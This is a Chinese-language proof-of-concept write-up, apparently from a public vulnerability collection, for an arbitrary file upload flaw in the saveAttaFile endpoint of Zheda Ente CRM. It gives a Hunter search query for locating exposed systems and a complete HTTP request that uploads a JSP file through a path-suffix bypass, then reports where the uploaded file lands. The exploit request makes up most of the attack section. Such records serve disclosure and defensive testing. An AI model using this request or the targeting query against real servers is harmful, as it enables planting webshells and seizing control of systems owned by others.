# 浙大恩特CRM saveAttaFile任意文件上传漏洞

# 一、漏洞简介
<font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM是由浙江大学恩智浙大科技有限公司推出的客户关系管理（CRM）系统。该系统旨在帮助企业高效管理客户关系，提升销售业绩，促进市场营销和客户服务的优化。系统支持客户数据分析和报表展示，帮助企业深度挖掘客户数据，提供决策参考。浙大恩特CRM saveAttaFile存在任意文件上传漏洞，攻击者可通过该漏洞获取服务器控制权限。</font>

# <font style="color:rgba(0, 0, 0, 0.9);">二、影响版本</font>
+ <font style="color:rgba(0, 0, 0, 0.9);">浙大恩特CRM</font>

# <font style="color:rgba(0, 0, 0, 0.9);">三、资产测绘</font>
+ hunter`app.name="浙大恩特 CRM"`
+ 特征


# 四、漏洞复现
```plain
POST /entsoft/MailAction.entphone;.js?act=saveAttaFile HTTP/1.1
Host: xx.xx.xx.xx
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Content-Type: multipart/form-data; boundary=----WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Length: 179

------WebKitFormBoundarye8FPHsIAq9JN8j2A
Content-Disposition: form-data; name="file";filename="stc.jsp"
Content-Type: image/jpeg

stc
------WebKitFormBoundarye8FPHsIAq9JN8j2A--
```


根据响应获取上传文件位置

```plain
/enterdoc/EnterMail/20231118/2023111821425069561254581/stc.jsp
```


> 原文: <https://www.yuque.com/xiaokp7/ocvun2/eh97kwtudqbrgx9n>


---

> 来源：wy876 漏洞文库（https://github.com/wy876/POC (备份镜像 DMW11525708/wiki)）
